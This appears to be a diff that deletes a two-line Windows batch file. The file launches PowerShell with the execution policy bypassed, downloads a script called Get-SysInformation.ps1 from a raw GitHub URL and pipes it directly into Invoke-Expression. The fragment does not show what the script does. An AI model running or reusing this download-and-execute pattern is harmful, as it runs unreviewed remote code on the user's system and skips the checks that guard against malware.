@@ -1,2 +1,0 @@
-@echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing 'https://raw.githubusercontent.com/vinoaryo25/vinoaryo25/refs/heads/main/bin/Get-SysInformation.ps1' | iex"
